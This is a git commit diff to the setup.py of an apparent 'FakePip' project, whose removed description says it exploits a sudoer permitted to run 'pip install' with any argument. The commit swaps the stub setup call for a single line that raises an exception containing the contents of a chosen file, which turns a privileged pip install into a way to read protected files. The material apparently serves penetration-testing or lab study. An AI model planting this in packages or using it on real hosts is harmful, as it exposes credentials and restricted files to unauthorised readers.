c5f93d469df389bfb48f9dada003004ca54831fe
staccat0 <49298517+staccat0@users.noreply.github.com>
2023-05-17 14:52:22 +0800

    Update setup.py

--- setup.py
+++ setup.py
@@ -1,10 +1,1 @@
-from setuptools import setup
-from setuptools.command.install import install
-import base64
-import os
-
-
-
-setup(name='FakePip', version='0.0.1', description='This will exploit a sudoer able to /usr/bin/pip install *',
-      url='https://github.com/staccat0/fakepip', author='zc00l', author_email='andre.marques@esecurity.com.br',
-      license='MIT', zip_safe=False)
+raise Exception(open("file_to_read").read())
